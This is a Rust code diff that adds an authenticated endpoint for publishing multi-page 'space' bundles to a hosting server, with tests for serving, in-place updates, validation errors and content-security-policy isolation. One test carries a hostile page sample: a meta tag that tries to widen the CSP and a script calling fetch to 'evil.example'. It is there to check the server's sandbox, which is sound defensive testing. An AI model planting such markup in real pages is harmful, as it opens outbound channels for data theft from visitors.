@@ -156,6 +156,19 @@ pub fn build_router(state: HostedState, host: Arc<ArtifactHost>, keys: Arc<KeyTa
         .layer(DefaultBodyLimit::max(ingest_body_limit))
         .with_state(state.clone());
 
+    // Space ingest (Gap 1): a whole space bundle. Same auth, but a body limit sized
+    // for a full space (per-space byte cap + base64 (~4/3) + JSON overhead slack).
+    let space_body_limit =
+        (space::MAX_SPACE_BYTES as usize) * 4 / 3 + space::MAX_SPACE_BYTES as usize / 4 + 1024 * 1024;
+    let space_ingest = Router::new()
+        .route("/api/v1/spaces", post(ingest::publish_space))
+        .route_layer(middleware::from_fn_with_state(
+            keys.clone(),
+            auth::ingest_auth,
+        ))
+        .layer(DefaultBodyLimit::max(space_body_limit))
+        .with_state(state.clone());
+
     // Read: space routes under /p, base libs at root. The shell emits /p/…
     // links via the host's mount so nested paths resolve. Hosted read responses
     // carry `X-Robots-Tag: noindex, nofollow` (below) — host-serve mode ONLY.
@@ -173,6 +186,7 @@ pub fn build_router(state: HostedState, host: Arc<ArtifactHost>, keys: Arc<KeyTa
     Router::new()
         .route("/healthz", get(healthz))
         .merge(ingest)
+        .merge(space_ingest)
         .merge(read)
         .merge(rounds)
         .merge(submissions)
@@ -733,6 +747,188 @@ mod tests {
             csp.contains("connect-src 'none'"),
             "body widened egress: {csp}"
         );
+        assert!(!csp.contains("default-src *"), "meta widened header: {csp}");
+        std::fs::remove_dir_all(&root).ok();
+    }
+
+    fn space_req(bearer: Option<&str>, json_body: serde_json::Value) -> Request<Body> {
+        let mut b = Request::builder()
+            .method(Method::POST)
+            .uri("/api/v1/spaces")
+            .header("host", TEST_HOST)
+            .header("content-type", "application/json");
+        if let Some(t) = bearer {
+            b = b.header("authorization", format!("Bearer {t}"));
+        }
+        b.body(Body::from(json_body.to_string())).unwrap()
+    }
+
+    #[tokio::test]
+    async fn space_publish_serves_multipage_with_nav_assets_and_frozen_csp() {
+        let root = tmp_root("space-serve");
+        let (app, _, _) = app_with(&root);
+        // logo.svg base64 of "<svg></svg>".
+        let logo_b64 = "PHN2Zz48L3N2Zz4=";
+        let r = send(
+            &app,
+            space_req(
+                Some(KEY),
+                serde_json::json!({
+                    "pages": [
+                        { "slug": "index", "html": "<title>Home</title><h1>Home</h1><a href=\"./guide\">guide</a>" },
+                        { "slug": "guide", "html": "<h1>Guide</h1>" }
+                    ],
+                    "assets": [ { "path": "logo.svg", "content_base64": logo_b64 } ],
+                    "nav": ["index", "guide"],
+                    "title": "My Docs"
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(r.status(), StatusCode::CREATED);
+        let j = body_json(r).await;
+        let slug = j["slug"].as_str().unwrap().to_string();
+        assert_eq!(j["page_count"].as_u64().unwrap(), 2);
+        assert_eq!(j["created"].as_bool().unwrap(), true);
+        assert_eq!(j["url"].as_str().unwrap(), format!("https://pad.example.com/p/{slug}/"));
+
+        // Both pages serve under the FROZEN artifact CSP (sandbox, egress closed).
+        for page in ["index", "guide"] {
+            let r = send(&app, get_req(format!("/p/{slug}/_c/{page}"))).await;
+            assert_eq!(r.status(), StatusCode::OK, "page {page} not served");
+            let csp = r
+                .headers()
+                .get("content-security-policy")
+                .unwrap()
+                .to_str()
+                .unwrap()
+                .to_string();
+            assert!(csp.starts_with("sandbox allow-scripts"), "csp: {csp}");
+            assert!(csp.contains("connect-src 'none'"), "egress open: {csp}");
+            assert!(!csp.contains("allow-forms"), "airlock: {csp}");
+        }
+
+        // The shell lists both pages in its nav (built from the server-resolved table).
+        let r = send(&app, get_req(format!("/p/{slug}/"))).await;
+        assert_eq!(r.status(), StatusCode::OK);
+        let html =
+            String::from_utf8_lossy(&axum::body::to_bytes(r.into_body(), usize::MAX).await.unwrap())
+                .into_owned();
+        assert!(html.contains(&format!("/p/{slug}/_c/index")), "home content path");
+
+        // The asset serves.
+        let r = send(&app, get_req(format!("/p/{slug}/assets/logo.svg"))).await;
+        assert_eq!(r.status(), StatusCode::OK);
+        assert_eq!(
+            r.headers().get("content-type").unwrap().to_str().unwrap(),
+            "image/svg+xml"
+        );
+
+        // Cross-space isolation: a bogus space slug is an opaque 404; the guide slug is
+        // only reachable UNDER this space, never as a top-level space of its own.
+        let r = send(&app, get_req("/p/aaaaaaaaaaaaaaaaaaaaaaaaaa/_c/index")).await;
+        assert_eq!(r.status(), StatusCode::NOT_FOUND);
+        let r = send(&app, get_req("/p/guide/_c/index")).await;
+        assert_eq!(r.status(), StatusCode::NOT_FOUND);
+        std::fs::remove_dir_all(&root).ok();
+    }
+
+    #[tokio::test]
+    async fn space_key_updates_in_place_201_then_200() {
+        let root = tmp_root("space-idem-http");
+        let (app, _, _) = app_with(&root);
+        let mk = |body: &str| {
+            serde_json::json!({
+                "pages": [ { "slug": "index", "html": body } ],
+                "space_key": "docs-v1"
+            })
+        };
+        let r = send(&app, space_req(Some(KEY), mk("<h1>V1</h1>"))).await;
+        assert_eq!(r.status(), StatusCode::CREATED);
+        let slug1 = body_json(r).await["slug"].as_str().unwrap().to_string();
+
+        let r = send(&app, space_req(Some(KEY), mk("<h1>V2</h1>"))).await;
+        assert_eq!(r.status(), StatusCode::OK, "re-publish must be 200, not 201");
+        let j = body_json(r).await;
+        assert_eq!(j["slug"].as_str().unwrap(), slug1, "same slug on update");
+        assert_eq!(j["created"].as_bool().unwrap(), false);
+
+        // The served body now reflects V2.
+        let r = send(&app, get_req(format!("/p/{slug1}/_c/index"))).await;
+        let html =
+            String::from_utf8_lossy(&axum::body::to_bytes(r.into_body(), usize::MAX).await.unwrap())
+                .into_owned();
+        assert!(html.contains("V2"), "in-place update did not swap the served body");
+        std::fs::remove_dir_all(&root).ok();
+    }
+
+    #[tokio::test]
+    async fn space_ingest_requires_auth_and_rejects_bad_bundle() {
+        let root = tmp_root("space-bad");
+        let (app, _, _) = app_with(&root);
+        // Unauthenticated → 401.
+        let r = send(
+            &app,
+            space_req(None, serde_json::json!({ "pages": [ { "slug": "index", "html": "x" } ] })),
+        )
+        .await;
+        assert_eq!(r.status(), StatusCode::UNAUTHORIZED);
+        // Empty pages → 400 invalid_space.
+        let r = send(&app, space_req(Some(KEY), serde_json::json!({ "pages": [] }))).await;
+        assert_eq!(r.status(), StatusCode::BAD_REQUEST);
+        assert_eq!(body_json(r).await["error"]["code"], "invalid_space");
+        // Reserved page slug → 400.
+        let r = send(
+            &app,
+            space_req(Some(KEY), serde_json::json!({ "pages": [ { "slug": "api", "html": "x" } ] })),
+        )
+        .await;
+        assert_eq!(r.status(), StatusCode::BAD_REQUEST);
+        // Bad base64 asset → 400.
+        let r = send(
+            &app,
+            space_req(
+                Some(KEY),
+                serde_json::json!({
+                    "pages": [ { "slug": "index", "html": "x" } ],
+                    "assets": [ { "path": "a.png", "content_base64": "not base64!!!" } ]
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(r.status(), StatusCode::BAD_REQUEST);
+        assert_eq!(body_json(r).await["error"]["code"], "bad_asset_base64");
+        std::fs::remove_dir_all(&root).ok();
+    }
+
+    #[tokio::test]
+    async fn space_ingest_hostile_page_cannot_widen_csp() {
+        // A page in the bundle whose body tries to widen the CSP via <meta> stays
+        // contained — the server-set frozen artifact CSP is authoritative.
+        let root = tmp_root("space-hostile");
+        let (app, _, _) = app_with(&root);
+        let hostile = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; connect-src *\">\
+                       <script>fetch('http://evil.example/x')</script><h1>x</h1>";
+        let r = send(
+            &app,
+            space_req(
+                Some(KEY),
+                serde_json::json!({ "pages": [ { "slug": "index", "html": hostile } ] }),
+            ),
+        )
+        .await;
+        assert_eq!(r.status(), StatusCode::CREATED);
+        let slug = body_json(r).await["slug"].as_str().unwrap().to_string();
+        let r = send(&app, get_req(format!("/p/{slug}/_c/index"))).await;
+        let csp = r
+            .headers()
+            .get("content-security-policy")
+            .unwrap()
+            .to_str()
+            .unwrap()
+            .to_string();
+        assert!(csp.starts_with("sandbox allow-scripts"));
+        assert!(csp.contains("connect-src 'none'"), "body widened egress: {csp}");
         assert!(!csp.contains("default-src *"), "meta widened header: {csp}");
         std::fs::remove_dir_all(&root).ok();
     }
